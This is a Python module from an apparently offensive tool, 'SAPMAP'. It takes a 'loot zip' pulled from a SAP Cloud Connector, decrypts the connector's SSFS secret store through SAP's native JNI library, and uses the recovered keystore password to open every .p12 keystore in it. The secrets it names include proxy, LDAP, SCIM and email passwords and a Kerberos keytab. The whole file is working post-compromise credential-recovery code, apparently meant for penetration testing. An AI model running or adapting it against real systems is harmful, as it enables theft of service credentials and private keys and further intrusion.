#!/usr/bin/env python3
"""SAPMAP — decrypt the SAP Cloud Connector SSFS and unlock its keystores.

Two-stage post-processing of the loot zip produced by sapmap_scc_keystore:

    1. SSFS decryption.  Run the JNI helper at tools/ssfs_decrypt/
       decrypt-ssfs.jar (built by the operator from the bundled .java
       sources) which calls libsapscc20jni's getRecord() to recover the
       plaintext for each SSFS entry.  The juicy one is
       CLOUD_CONN/JAVA_KEYSTORE_PASSWORD — that password unlocks every
       .p12 in the SCC backup.

    2. Keystore unlock.  With JAVA_KEYSTORE_PASSWORD in hand, every .p12
       inside the loot zip is loaded with `cryptography`'s pkcs12
       parser.  We read out the alias, certificate (subject, issuer,
       SHA-256 of DER), and the private-key SHA-256 (DER form, no key
       material exfiltrated to logs).

Cross-platform: the Java helper supports Linux (libsapscc20jni.so) and
Windows (sapscc20jni.dll) via the JVM property -Dscc.jni.lib=<abspath>,
or by relying on java.library.path / LD_LIBRARY_PATH / PATH.

The plaintext SSFS dump is written to a side file under the same loot
directory at mode 0600 so the operator can review the values without
SAPMAP itself logging them.  Findings/drawer only show the *names* of
recovered keys, not their values.
"""
from __future__ import annotations

import hashlib
import io
import json
import os
import platform
import shutil
import subprocess
import tempfile
import zipfile
from datetime import datetime
from typing import Optional


SSFS_KEYS = (
    "CLOUD_CONN/JAVA_KEYSTORE_PASSWORD",
    "CLOUD_CONN/SYSTEM_CERTIFICATE",
    "CLOUD_CONN/PROXY_PASSWORD",
    "CLOUD_CONN/KERBEROS_KTAB",
    "CLOUD_CONN/LDAP_SERVICE_USER_PASSWORD",
    "CLOUD_CONN/SCIM_SERVICE_USER_PASSWD",
    "CLOUD_CONN/ALERT_EMAIL_SERVER_SECRET",
)

# Installer-default locations of libsapscc20jni — operators can override.
DEFAULT_NATIVE_HINTS_LINUX = (
    "/opt/sap/scc/lib/libsapscc20jni.so",
    "/opt/sap/scc/libsapscc20jni.so",
    "/usr/lib/libsapscc20jni.so",
)
DEFAULT_NATIVE_HINTS_WIN = (
    r"C:\Program Files\sapcc\lib\sapscc20jni.dll",
    r"C:\sap\scc\lib\sapscc20jni.dll",
    r"C:\sapcc\sapscc20jni.dll",
)


def _slug(s: str) -> str:
    import re
    return re.sub(r"[^A-Za-z0-9._-]+", "_", s or "?")


def _sha256(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def find_helper_jar(start_dir: Optional[str] = None) -> Optional[str]:
    """Locate the operator-built decrypt-ssfs.jar.

    Search order: explicit env var SAPMAP_SSFS_JAR -> tools/ssfs_decrypt/
    relative to the SAPMAP project -> CWD.
    """
    env = os.environ.get("SAPMAP_SSFS_JAR")
    if env and os.path.isfile(env):
        return env
    here = os.path.dirname(os.path.abspath(__file__))
    candidates = [
        os.path.join(here, "tools", "ssfs_decrypt", "decrypt-ssfs.jar"),
        os.path.join(start_dir or os.getcwd(), "decrypt-ssfs.jar"),
    ]
    for c in candidates:
        if os.path.isfile(c):
            return c
    return None


def find_native_lib(scc_native_dir: Optional[str] = None) -> Optional[str]:
    """Locate libsapscc20jni.so / sapscc20jni.dll.

    If ``scc_native_dir`` is a directory we look for both names inside
    it; if it's a file we return it as-is.  Otherwise we try the
    installer-default hints for the running OS.
    """
    if scc_native_dir:
        if os.path.isfile(scc_native_dir):
            return scc_native_dir
        if os.path.isdir(scc_native_dir):
            for name in ("libsapscc20jni.so", "sapscc20jni.dll"):
                p = os.path.join(scc_native_dir, name)
                if os.path.isfile(p):
                    return p
    hints = (DEFAULT_NATIVE_HINTS_WIN
             if platform.system().lower().startswith("win")
             else DEFAULT_NATIVE_HINTS_LINUX)
    for h in hints:
        if os.path.isfile(h):
            return h
    return None


def _extract_ssfs_to_tmp(loot_zip_path: str) -> Optional[str]:
    """Extract scc_config/SSFS_SCC.{KEY,DAT} from the loot zip into a
    fresh temp dir at mode 0700.  Returns the temp-dir path or None."""
    try:
        zf = zipfile.ZipFile(loot_zip_path)
    except Exception:
        return None
    members = {i.filename: i for i in zf.infolist()}
    key = members.get("scc_config/SSFS_SCC.KEY")
    dat = members.get("scc_config/SSFS_SCC.DAT")
    if not (key and dat):
        return None
    tmp = tempfile.mkdtemp(prefix="sapmap_ssfs_")
    try:
        os.chmod(tmp, 0o700)
    except Exception:
        pass
    with open(os.path.join(tmp, "SSFS_SCC.KEY"), "wb") as f:
        f.write(zf.read(key))
    with open(os.path.join(tmp, "SSFS_SCC.DAT"), "wb") as f:
        f.write(zf.read(dat))
    return tmp


def decrypt_ssfs(loot_zip_path: str, *,
                 scc_native_lib: Optional[str] = None,
                 helper_jar: Optional[str] = None,
                 java_bin: str = "java",
                 sid: str = "SCC",
                 timeout: float = 30.0,
                 keys: Optional[tuple] = None
                 ) -> dict:
    """Run the JNI helper against the SSFS pulled from the loot zip.

    Returns ``{ok, secrets: {key: plaintext|None}, error}``.  ``secrets``
    is the parsed JSON dict from the helper.  Caller is responsible for
    persisting the values securely.
    """
    if not os.path.isfile(loot_zip_path):
        return {"ok": False, "error": f"loot zip not found: {loot_zip_path}"}
    jar = helper_jar or find_helper_jar()
    if not jar:
        return {"ok": False,
                "error": "decrypt-ssfs.jar not built — run "
                         "`make` in tools/ssfs_decrypt/ on a host with "
                         "JDK + libsapscc20jni installed"}
    native = scc_native_lib or find_native_lib()
    if not native:
        return {"ok": False,
                "error": "libsapscc20jni.so / sapscc20jni.dll not found — "
                         "pass scc_native_lib or set its directory"}
    if not shutil.which(java_bin):
        return {"ok": False,
                "error": f"`{java_bin}` not on PATH — install a JDK or pass java_bin"}

    tmp = _extract_ssfs_to_tmp(loot_zip_path)
    if not tmp:
        return {"ok": False, "error": "loot zip lacks SSFS_SCC.KEY/.DAT"}
    try:
        cmd = [java_bin, f"-Dscc.jni.lib={native}",
               "-jar", jar]
        if keys:
            cmd.extend(keys)
        env = os.environ.copy()
        env["SAPSYSTEMNAME"] = sid
        env["RSEC_SSFS_DATAPATH"] = tmp
        # Make sure JNI can also locate the lib via OS search path.
        if platform.system().lower().startswith("win"):
            env["PATH"] = os.path.dirname(native) + os.pathsep + env.get("PATH", "")
        else:
            env["LD_LIBRARY_PATH"] = (
                os.path.dirname(native) + os.pathsep
                + env.get("LD_LIBRARY_PATH", ""))
        try:
            proc = subprocess.run(cmd, env=env, capture_output=True,
                                  timeout=timeout, text=True)
        except subprocess.TimeoutExpired:
            return {"ok": False, "error": f"java helper timed out after {timeout}s"}
        if proc.returncode != 0:
            return {"ok": False,
                    "error": f"java helper exit {proc.returncode}: "
                             f"{(proc.stderr or '').strip()[:300]}"}
        out = (proc.stdout or "").strip()
        if not out:
            return {"ok": False, "error": "java helper produced empty output"}
        try:
            secrets = json.loads(out.splitlines()[-1])
        except Exception as e:
            return {"ok": False,
                    "error": f"could not parse helper output as JSON: {e}; "
                             f"stdout={out[:200]!r}"}
        return {"ok": True, "secrets": secrets, "native_lib": native,
                "helper_jar": jar}
    finally:
        try:
            shutil.rmtree(tmp, ignore_errors=True)
        except Exception:
            pass


def unlock_keystores(loot_zip_path: str, password: str) -> dict:
    """Open every .p12 in the loot zip with ``password`` and pull metadata.

    Returns ``{ok, keystores: [...], error}``.  Each keystore entry:
        path, alias, friendly_name, cert_subject, cert_issuer,
        cert_sha256, cert_not_before, cert_not_after, key_type,
        key_size, key_sha256, extra_certs (list of subjects)
    """
    try:
        from cryptography.hazmat.primitives.serialization import (
            pkcs12, Encoding, PrivateFormat, NoEncryption,
            PublicFormat,
        )
        from cryptography.hazmat.primitives.asymmetric import rsa, ec
    except Exception as e:
        return {"ok": False,
                "error": f"`cryptography` not installed: {e}; "
                         f"pip install cryptography"}
    try:
        zf = zipfile.ZipFile(loot_zip_path)
    except Exception as e:
        return {"ok": False, "error": f"cannot open loot zip: {e}"}
    pwd = password.encode() if password else None
    out = []
    for info in zf.infolist():
        if not info.filename.endswith(".p12"):
            continue
        blob = zf.read(info)
        try:
            key, cert, extras = pkcs12.load_key_and_certificates(blob, pwd)
        except Exception as e:
            out.append({"path": info.filename, "error": f"unlock failed: {e}"})
            continue
        entry = {"path": info.filename}
        if cert is not None:
            der = cert.public_bytes(Encoding.DER)
            entry.update({
                "cert_subject": cert.subject.rfc4514_string(),
                "cert_issuer": cert.issuer.rfc4514_string(),
                "cert_sha256": _sha256(der),
                "cert_not_before": cert.not_valid_before_utc.isoformat()
                                    if hasattr(cert, "not_valid_before_utc")
                                    else cert.not_valid_before.isoformat(),
                "cert_not_after":  cert.not_valid_after_utc.isoformat()
                                    if hasattr(cert, "not_valid_after_utc")
                                    else cert.not_valid_after.isoformat(),
                "cert_serial": format(cert.serial_number, "x"),
            })
        if key is not None:
            try:
                pk_der = key.public_key().public_bytes(
                    Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
                entry["key_pubkey_sha256"] = _sha256(pk_der)
            except Exception:
                entry["key_pubkey_sha256"] = ""
            entry["key_type"] = type(key).__name__
            try:
                entry["key_size"] = key.key_size
            except Exception:
                entry["key_size"] = 0
        if extras:
            entry["extra_subjects"] = [c.subject.rfc4514_string() for c in extras]
            entry["extra_count"] = len(extras)
        out.append(entry)
    return {"ok": True, "keystores": out}


def decrypt_and_unlock(loot_zip_path: str, *,
                       scc_native_lib: Optional[str] = None,
                       helper_jar: Optional[str] = None,
                       java_bin: str = "java",
                       sid: str = "SCC",
                       loot_dir: Optional[str] = None,
                       timeout: float = 30.0
                       ) -> dict:
    """High-level: decrypt SSFS, unlock all .p12s, persist plaintext to
    a separate ``ssfs_secrets_<ts>.json`` next to the loot zip at mode 0600.

    Returns the merged result; caller (GUI route) decides which fields
    to surface in findings vs the drawer.
    """
    res = decrypt_ssfs(loot_zip_path,
                       scc_native_lib=scc_native_lib,
                       helper_jar=helper_jar, java_bin=java_bin,
                       sid=sid, timeout=timeout)
    if not res.get("ok"):
        return res
    secrets = res.get("secrets") or {}
    pwd = secrets.get("CLOUD_CONN/JAVA_KEYSTORE_PASSWORD") or ""
    # Persist plaintext side-channel.  Drawer / findings will only
    # reference this path; the values themselves never enter findings.
    out_dir = loot_dir or os.path.dirname(os.path.abspath(loot_zip_path))
    ts = datetime.now().strftime("%Y%m%dT%H%M%S")
    secrets_path = os.path.join(out_dir, f"ssfs_secrets_{ts}.json")
    body = {
        "fetched_at": datetime.now().isoformat(timespec="seconds"),
        "loot_zip": os.path.abspath(loot_zip_path),
        "native_lib": res.get("native_lib", ""),
        "secrets": secrets,
    }
    try:
        with open(secrets_path, "w", encoding="utf-8") as f:
            json.dump(body, f, indent=2)
        try:
            os.chmod(secrets_path, 0o600)
        except Exception:
            pass
    except Exception as e:
        return {"ok": False,
                "error": f"could not persist plaintext secrets: {e}"}
    out = {
        "ok": True,
        "secrets_path": secrets_path,
        "secrets_keys": [k for k, v in secrets.items() if v],
        "secrets_missing": [k for k, v in secrets.items() if not v],
        "native_lib": res.get("native_lib", ""),
        "helper_jar": res.get("helper_jar", ""),
        "keystore_password_recovered": bool(pwd),
        "keystore_password_length": len(pwd),
    }
    if pwd:
        un = unlock_keystores(loot_zip_path, pwd)
        out["unlock_ok"] = un.get("ok", False)
        out["unlock_error"] = un.get("error", "")
        out["keystores"] = un.get("keystores", [])
    else:
        out["unlock_ok"] = False
        out["unlock_error"] = "JAVA_KEYSTORE_PASSWORD not in SSFS"
        out["keystores"] = []
    return out
